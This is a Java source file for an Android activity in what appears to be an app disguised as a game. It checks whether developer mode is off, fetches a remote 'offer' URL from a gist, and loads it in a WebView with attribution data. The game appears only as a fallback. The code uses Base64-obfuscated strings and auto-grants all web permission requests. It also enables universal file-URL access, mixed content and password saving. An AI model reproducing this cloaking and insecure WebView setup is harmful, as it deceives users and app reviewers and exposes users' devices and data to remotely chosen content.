package com.lyurxu.jroek;

import static com.lyurxu.jroek.F_B_K.AD_ID;
import static com.lyurxu.jroek.F_B_K.strDeep;
import static com.lyurxu.jroek.ParseStr.decode;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.webkit.PermissionRequest;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import java.io.IOException;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class LJ extends AppCompatActivity {
    private ProgressBar progressBar;
    private WebView webView;
    private String link;
    private ValueCallback<Uri[]> myFilePathCallback;
    private SharedPreferences sPrefs;
    private String offer;
    private String fb_Id;
    public static final String URL_SHARED_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
    public static final int INPUT_FILE_REQUEST_CODE = 1;
    public static String keyDefault;
    public static String statusAppsFlyer;
    public static String strAppsFlyer;
    public static String AppsFl_Id;
    public static boolean afLoaded;
    public static boolean adIdInited;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        progressBar = findViewById(R.id.progressBar);

        if (!devModeOff()) {       // TODO delete !
            webView = findViewById(R.id.webView);
            setWebView(webView);

            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl(CNSTN.GistLink)
                    .build();
            GistApi gistApi = retrofit.create(GistApi.class);
            Call<ResponseBody> gistQuery = gistApi.getStringUrl();
            gistQuery.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {
                    if (response.isSuccessful() & response.body() != null) {
                        try {
                            String url = response.body().string();
                            String[] params = url.split("\\|");
                            offer = params[0];
                            keyDefault = params[1];
                            fb_Id = params[2];

                            F_B_K facebook = new F_B_K(fb_Id, LJ.this);
                            facebook.init();

                            sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                            link = sPrefs.getString(URL_SHARED_PREF, null);

//                            do {} while (!(afLoaded & AD_ID != null));
//                            startWebView(offer);

                            // TODO uncomment
//                            if (link != null) {
//                                webView.loadUrl(link);
//                            } else {
//                                do {
//                                }
//                                while (!(afLoaded & adIdInited));

                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        startWebView(offer);
                                    }
                                },5000);
  //                          }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else {
                        goToGame();
                    }
                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable t) {
                    goToGame();
                }
            });

        } else {
            goToGame();
        }
    }


    private void goToGame() {
        startActivity(new Intent(this, MMyGameActivity.class));
        finish();
    }

    void startWebView(String link) {
        if (statusAppsFlyer != null && statusAppsFlyer.equals(decode("Tm9uLW9yZ2FuaWM="))) {
            String url = link + strAppsFlyer;
            Log.i("MyApp", "non-organic - " + url);
            webView.loadUrl(url);
        } else if (strDeep != null) {
            String url = link + strDeep;
            webView.loadUrl(url);
            Log.i("MyApp", "deepLink - " + url);
        } else {
            if (keyDefault.equals("NO")) {
                goToGame();
            } else {
                String url = new ParseStr().parseOrganic(link);
                Log.i("MyApp", "organic - " + url);
                webView.loadUrl(url);
            }
        }
    }


    @Override
    public void onBackPressed() {
        webView.goBack();
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != INPUT_FILE_REQUEST_CODE || myFilePathCallback == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        if (resultCode == Activity.RESULT_OK & data != null) {
            String dataString = data.getDataString();
            Uri[] result = new Uri[]{Uri.parse(dataString)};
            myFilePathCallback.onReceiveValue(result);
            myFilePathCallback = null;
        }
    }

    private boolean devModeOff() {
        int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        return devInt == 0;
    }

    class MyWebChromeClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            myFilePathCallback = filePathCallback;
            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decode("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODE);
            return true;
        }

        @Override
        public void onPermissionRequest(PermissionRequest request) {
            request.grant(request.getResources());
        }
    }

    class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            webView.setVisibility(View.VISIBLE);
            progressBar.setVisibility(ProgressBar.INVISIBLE);

            if (url.contains(decode("NDA0"))) {
                goToGame();
                finish();
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            SharedPreferences.Editor editor = sPrefs.edit();
            editor.putString(URL_SHARED_PREF, url);
            editor.apply();
        }
    }

    private void setWebView(WebView webViewetgpy) {
        webViewetgpy.getSettings().setJavaScriptEnabled(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewetgpy.getSettings().setSaveFormData(true);
        webViewetgpy.getSettings().setMixedContentMode(0);
        webViewetgpy.getSettings().setSavePassword(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setLoadsImagesAutomatically(true);
        webViewetgpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewetgpy.getSettings().setDatabaseEnabled(true);
        webViewetgpy.getSettings().setLoadWithOverviewMode(true);
        webViewetgpy.getSettings().setUseWideViewPort(true);
        webViewetgpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webViewetgpy.getSettings().setEnableSmoothTransition(true);
        webViewetgpy.setWebChromeClient(new MyWebChromeClient());
        webViewetgpy.setWebViewClient(new MyWebViewClient());
    }
}


